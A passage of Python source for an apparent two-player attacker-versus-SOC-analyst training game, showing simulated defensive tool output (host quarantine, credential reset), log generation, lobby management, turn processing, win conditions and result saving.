━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[+] Network containment ACTIVE
    — All inbound/outbound traffic blocked
    — Management channel preserved for IR
[+] Host will remain isolated until released by SOC

analyst@soc-ws:~$ Invoke-Command -ComputerName {host} \\
    -ScriptBlock {{ netsh advfirewall set allprofiles state on ; \\
                   netsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound }}
[+] Windows Firewall: all profiles → BLOCK (in+out)

[*] INC-{ticket_num} auto-created: "Host Quarantine: {host}"
[*] Event logged to SIEM case {case_id}"""

    if action_id == "reset_credentials":
        return f"""\
analyst@soc-ws:~$ pwsh
PowerShell 7.4.0 — Active Directory module loaded

PS> $scope = Get-ADUser -Filter * | Where-Object {{ $_.Enabled -eq $true }}
PS> $scope | Select-Object SamAccountName, PasswordLastSet | Format-Table
SamAccountName  PasswordLastSet
──────────────  ─────────────────────────
{u1}            {ts[:10]} ({days1} days ago)
{u2}            {ts[:10]} ({days2} days ago)

PS> $newPwd = ConvertTo-SecureString (New-Guid).Guid -AsPlainText -Force
PS> Set-ADAccountPassword -Identity {u1} -Reset -NewPassword $newPwd
PS> Set-ADAccountPassword -Identity {u2} -Reset -NewPassword $newPwd

[+] Passwords reset for {n} affected accounts.

PS> Invoke-Command -ComputerName {host} -ScriptBlock {{ klist purge }}
[+] Kerberos ticket cache purged on {host}.

[*] Users notified via out-of-band email.
[*] Event logged to SIEM — case {case_id}"""

    if action_id == "ignore":
        return f"""\
analyst@soc-ws:~$ splunk search 'index=main alert_id={alert_id}'
TIME          EVENT
────────────────────────────────────────────────────────────────────
{ts}  [SIEM] Alert #{alert_id}: Low-confidence heuristic match — possible FP

analyst@soc-ws:~$ siem-cli update-alert \\
    --id {alert_id} --status acknowledged --priority low \\
    --note "Low confidence — monitoring. No action taken."

[*] Alert #{alert_id} deprioritised.
[!] WARNING: If this is a true positive the threat actor remains active.
[!] Consider revisiting if further anomalies are detected."""

    return f"analyst@soc-ws:~$ echo 'Action: {action_id}'\n[+] Done."


def _make_log(action_id: str) -> str:
    """Return a realistic log line for the given action."""
    templates = _LOG_TEMPLATES.get(action_id, ["[SYS] Activity detected"])
    tmpl = random.choice(templates)
    ts = datetime.now(timezone.utc).strftime("%H:%M:%S")
    return tmpl.format(
        ip=random.choice(_RANDOM_IPS),
        host=random.choice(_RANDOM_HOSTS),
        host2=random.choice(_RANDOM_HOSTS),
        user=random.choice(_RANDOM_USERS),
        port=random.choice(_RANDOM_PORTS),
        cve=random.choice(_RANDOM_CVES),
        n=random.randint(10, 50),
        mb=random.randint(50, 500),
        id=str(uuid.uuid4())[:8].upper(),
        ts=ts,
    )


# ── Lobby helpers ──────────────────────────────────────────────────────────────

def create_lobby(name: str, username: str, sid: str) -> dict:
    """Create a new lobby and return its dict."""
    lobby_id = str(uuid.uuid4())
    lobby = {
        "id": lobby_id,
        "name": name.strip() or f"{username}'s lobby",
        "players": [{"username": username, "sid": sid}],
        "status": "waiting",
    }
    lobbies[lobby_id] = lobby
    return lobby


def join_lobby(lobby_id: str, username: str, sid: str) -> tuple[dict | None, str]:
    """
    Attempt to join a lobby.

    Returns (lobby, error_message).  error_message is '' on success.
    """
    lobby = lobbies.get(lobby_id)
    if not lobby:
        return None, "Lobby not found."
    if lobby["status"] == "in_game":
        return None, "Game already in progress."
    if len(lobby["players"]) >= 2:
        return None, "Lobby is full."
    # Prevent the same user from joining twice
    if any(p["username"] == username for p in lobby["players"]):
        return None, "You are already in this lobby."
    lobby["players"].append({"username": username, "sid": sid})
    return lobby, ""


def leave_lobby(lobby_id: str, username: str) -> dict | None:
    """
    Remove *username* from the lobby.  Deletes empty lobbies.

    Returns the updated lobby (or None if deleted).
    """
    lobby = lobbies.get(lobby_id)
    if not lobby:
        return None
    lobby["players"] = [p for p in lobby["players"] if p["username"] != username]
    if not lobby["players"]:
        del lobbies[lobby_id]
        return None
    # Reset status if a player leaves mid-game
    lobby["status"] = "waiting"
    return lobby


def get_lobbies_list() -> list:
    """Return a JSON-serialisable list of all lobbies."""
    result = []
    for lb in lobbies.values():
        result.append({
            "id": lb["id"],
            "name": lb["name"],
            "players": [p["username"] for p in lb["players"]],
            "status": lb["status"],
        })
    return result


# ── Game helpers ───────────────────────────────────────────────────────────────

def start_game(lobby_id: str) -> dict:
    """
    Initialise game state for *lobby_id*.

    First player is attacker, second is analyst.
    Returns the initial game state dict.
    """
    lobby = lobbies[lobby_id]
    attacker = lobby["players"][0]
    analyst  = lobby["players"][1]

    game = {
        "id": lobby_id,
        "lobby_name": lobby["name"],
        "attacker": attacker,
        "analyst":  analyst,
        "phase": "setup",           # "setup" → both pick options → "playing" → "ended"
        "turn": 1,
        "current_player": "attacker",
        "attacker_progress": 0,
        "detection_level": 0,
        # Setup state for both players
        "attacker_intel_sources": [],
        "attacker_intel_data": {},
        "attacker_setup_done": False,
        "analyst_defenses": [],
        "analyst_setup_done": False,
        "logs": [],
        "alerts": [],
        "winner": None,
        "win_reason": "",
        "status": "active",
        "last_containment": False,
        "last_attacker_output": "",
        "last_analyst_output": "",
    }
    games[lobby_id] = game
    lobby["status"] = "in_game"
    return game


def attacker_select_intel(lobby_id: str, sources: list) -> tuple[dict | None, str]:
    """
    Store the attacker's chosen intel sources, generate the intel dossier,
    and advance the setup phase when both players are ready.

    Exactly 2 sources must be chosen.
    Returns (game_state, error).
    """
    game = games.get(lobby_id)
    if not game:
        return None, "Game not found."
    if game["phase"] != "setup":
        return None, "Intel selection phase already passed."
    if game.get("attacker_setup_done"):
        return None, "Intel sources already selected."
    valid = set(INTEL_SOURCES.keys())
    chosen = [s for s in sources if s in valid]
    if len(chosen) != 2:
        return None, "Select exactly 2 intel sources."

    game["attacker_intel_sources"] = chosen
    game["attacker_intel_data"] = generate_intel(chosen)
    game["attacker_setup_done"] = True

    for s in chosen:
        label = INTEL_SOURCES[s]["label"]
        game["logs"].append(f"[SETUP] Attacker conducted OSINT: {label}")

    _check_setup_complete(game)
    return game, ""


def analyst_select_defenses(lobby_id: str, defenses: list) -> tuple[dict | None, str]:
    """
    Store the analyst's chosen defenses and advance the setup phase when both ready.

    Exactly 2 defenses must be chosen.
    Returns (game_state, error).
    """
    game = games.get(lobby_id)
    if not game:
        return None, "Game not found."
    if game["phase"] != "setup":
        return None, "Defense selection phase already passed."
    if game.get("analyst_setup_done"):
        return None, "Defenses already selected."
    valid = set(ANALYST_DEFENSES.keys())
    chosen = [d for d in defenses if d in valid]
    if len(chosen) != 2:
        return None, "Select exactly 2 defenses."
    game["analyst_defenses"] = chosen
    game["analyst_setup_done"] = True

    for d in chosen:
        label = ANALYST_DEFENSES[d]["label"]
        game["logs"].append(f"[SETUP] Analyst deployed defense: {label}")

    _check_setup_complete(game)
    return game, ""


def _check_setup_complete(game: dict) -> None:
    """Transition to playing phase once both players have completed setup."""
    if game.get("attacker_setup_done") and game.get("analyst_setup_done"):
        game["phase"] = "playing"
        game["logs"].append("[GAME] ── Both players ready. Game begins! Attacker moves first. ──")


def process_attacker_action(
    lobby_id: str,
    action_id: str,
    extra: dict = None,
) -> tuple[dict | None, str]:
    """
    Process an attacker action and return updated game state.

    Pass extra={'phishing_email_id': '<id>'} when the attacker uses phishing.
    Returns (game_state, error).
    """
    game = games.get(lobby_id)
    if not game:
        return None, "Game not found."
    if game["status"] != "active":
        return None, "Game is over."
    if game["phase"] != "playing":
        return None, "Game not in playing phase."
    if game["current_player"] != "attacker":
        return None, "Not attacker's turn."

    action = ATTACKER_ACTIONS.get(action_id)
    if not action:
        return None, "Unknown action."

    # Check unlock requirement
    if action.get("requires_progress", 0) > game["attacker_progress"]:
        return None, f"Need {action['requires_progress']}% progress to use this action."

    extra = extra or {}
    progress_gain  = action["base_progress"]
    detection_risk = action["detection_risk"]

    # ── Phishing email selection modifier ────────────────────────────────────
    if action_id == "phishing":
        phishing_email_id = extra.get("phishing_email_id")
        email_tmpl = next((e for e in PHISHING_EMAILS if e["id"] == phishing_email_id), None)
        if email_tmpl:
            sources   = game.get("attacker_intel_sources", [])
            has_intel = all(r in sources for r in email_tmpl["requires_intel"])
            mult      = email_tmpl["progress_mult"] if has_intel else email_tmpl["progress_mult"] * 0.6
            detection_risk = max(0.05, min(0.95, detection_risk + email_tmpl["detection_adj"]))
        else:
            mult = 0.80  # fallback: treat as generic
        progress_gain = max(3, int(progress_gain * mult))

    # ── Counter-defense reduction ─────────────────────────────────────────────
    countered = [c for c in action["countered_by"] if c in game["analyst_defenses"]]
    if countered:
        progress_gain = max(3, progress_gain // 2)

    # ── EDR detection boost ───────────────────────────────────────────────────
    if "edr" in game["analyst_defenses"]:
        detection_risk = min(0.90, detection_risk + 0.20)

    game["attacker_progress"] = min(100, game["attacker_progress"] + progress_gain)

    # ── Detection roll ────────────────────────────────────────────────────────
    detected = random.random() < detection_risk
    if detected:
        game["detection_level"] = min(100, game["detection_level"] + 5)
        alert = f"⚠️ ALERT: {action['label']} detected — suspicious activity flagged!"
        game["alerts"].append(alert)

    game["logs"].append(_make_log(action_id))

    # ── Add background SIEM noise ─────────────────────────────────────────────
    game["logs"].extend(_make_noise_logs(random.randint(2, 4)))

    # ── Generate CLI output ───────────────────────────────────────────────────
    game["last_attacker_output"] = _make_cli_output(action_id, game, extra)

    _check_win(game)

    if game["status"] == "active":
        game["current_player"] = "analyst"
        game["turn"] += 1

    return game, ""


def process_analyst_action(lobby_id: str, action_id: str) -> tuple[dict | None, str]:
    """
    Process an analyst action and return updated game state.

    Returns (game_state, error).
    """
    game = games.get(lobby_id)
    if not game:
        return None, "Game not found."
    if game["status"] != "active":
        return None, "Game is over."
    if game["phase"] != "playing":
        return None, "Game not in playing phase."
    if game["current_player"] != "analyst":
        return None, "Not analyst's turn."

    action = ANALYST_ACTIONS.get(action_id)
    if not action:
        return None, "Unknown action."

    game["detection_level"] = min(100, game["detection_level"] + action["detection_gain"])
    game["attacker_progress"] = max(0, game["attacker_progress"] - action["progress_reduction"])
    game["last_containment"] = action["is_containment"]

    game["logs"].append(_make_log(action_id))

    # ── Add background SIEM noise ─────────────────────────────────────────────
    game["logs"].extend(_make_noise_logs(random.randint(2, 4)))

    # ── Generate SOC tool output ──────────────────────────────────────────────
    game["last_analyst_output"] = _make_siem_tool_output(action_id, game)

    _check_win(game)

    if game["status"] == "active":
        game["current_player"] = "attacker"

    return game, ""


def _check_win(game: dict) -> None:
    """Mutate *game* to set winner/status if a win condition is met."""
    if game["attacker_progress"] >= 100:
        game["status"] = "ended"
        game["phase"]  = "ended"
        game["winner"] = "attacker"
        game["win_reason"] = "Attacker successfully exfiltrated all target data!"
        game["logs"].append("[GAME OVER] Attacker wins — data breach complete!")
    elif game["detection_level"] >= 100 and game["last_containment"]:
        game["status"] = "ended"
        game["phase"]  = "ended"
        game["winner"] = "analyst"
        game["win_reason"] = "Analyst detected and contained the threat!"
        game["logs"].append("[GAME OVER] Analyst wins — threat fully contained!")


def get_game_state_for_player(lobby_id: str, role: str) -> dict | None:
    """
    Return a trimmed game-state dict appropriate for *role* ('attacker'/'analyst').

    Both roles see public fields; the attacker also receives their private intel dossier.
    """
    game = games.get(lobby_id)
    if not game:
        return None

    state = {
        "id": game["id"],
        "lobby_name": game["lobby_name"],
        "attacker_username": game["attacker"]["username"],
        "analyst_username":  game["analyst"]["username"],
        "phase": game["phase"],
        "turn":  game["turn"],
        "current_player": game["current_player"],
        "attacker_progress": game["attacker_progress"],
        "detection_level":   game["detection_level"],
        "analyst_defenses":  game["analyst_defenses"],
        "attacker_setup_done": game.get("attacker_setup_done", False),
        "analyst_setup_done":  game.get("analyst_setup_done",  False),
        "logs":   game["logs"][-60:],    # last 60 log lines (includes noise)
        "alerts": game["alerts"][-15:],  # last 15 alerts
        "winner":    game["winner"],
        "win_reason": game["win_reason"],
        "status": game["status"],
        "your_role": role,
        "attacker_actions":    _attacker_actions_payload(game),
        "analyst_actions":     _analyst_actions_payload(),
        "analyst_defenses_info": ANALYST_DEFENSES,
        "intel_sources_info":    INTEL_SOURCES,
        # Role-specific action output
        "last_action_output": (
            game.get("last_attacker_output", "")
            if role == "attacker"
            else game.get("last_analyst_output", "")
        ),
    }

    # ── Intel dossier — attacker eyes only ───────────────────────────────────
    if role == "attacker":
        state["intel_data"]             = game.get("attacker_intel_data", {})
        state["intel_sources_selected"] = game.get("attacker_intel_sources", [])

    return state


def _attacker_actions_payload(game: dict) -> list:
    """Build list of attacker actions with lock status and phishing email options."""
    actions = []
    for action_id, action in ATTACKER_ACTIONS.items():
        required = action.get("requires_progress", 0)
        entry = {
            "id":               action_id,
            "label":            action["label"],
            "icon":             action["icon"],
            "description":      action["description"],
            "locked":           game["attacker_progress"] < required,
            "requires_progress": required,
        }
        if action_id == "phishing" and game.get("attacker_intel_data"):
            entry["phishing_emails"] = _compute_phishing_email_options(game)
        actions.append(entry)
    return actions


def _analyst_actions_payload() -> list:
    """Build list of analyst in-game actions."""
    return [
        {
            "id": action_id,
            "label": action["label"],
            "icon": action["icon"],
            "description": action["description"],
            "is_containment": action["is_containment"],
        }
        for action_id, action in ANALYST_ACTIONS.items()
    ]


def save_duel_result(
    attempts_file: str,
    lobby_id: str,
    load_json_fn: Callable[[str], list],
    save_json_fn: Callable[[str, list], None],
) -> None:
    """
    Append duel result records to the shared attempts JSON file.

    One record is written for each player so both appear in their dashboards.
    """
    game = games.get(lobby_id)
    if not game or game["status"] != "ended":
        return

    now = datetime.now(timezone.utc).isoformat()
    attacker_username = game["attacker"]["username"]
    analyst_username  = game["analyst"]["username"]
    winner = game["winner"]

    records = [
        {
            "id": str(uuid.uuid4()),
            "username": attacker_username,
            "scenario_id": "duel_red_vs_blue",
            "duel": True,
            "opponent": analyst_username,
            "role": "attacker",
            "result": "win" if winner == "attacker" else "lose",
            "total_score": game["attacker_progress"],
            "time_taken": 0,
            "hints_used": 0,
            "longest_streak": 0,
            "timestamp": now,
        },
        {
            "id": str(uuid.uuid4()),
            "username": analyst_username,
            "scenario_id": "duel_red_vs_blue",
            "duel": True,
            "opponent": attacker_username,
            "role": "analyst",
            "result": "win" if winner == "analyst" else "lose",
            "total_score": game["detection_level"],
            "time_taken": 0,
            "hints_used": 0,
            "longest_streak": 0,
            "timestamp": now,
        },
    ]

    try:
        attempts = load_json_fn(attempts_file)
        attempts.extend(records)
        save_json_fn(attempts_file, attempts)
    except Exception:
        pass  # best-effort; never crash the game on a save failure

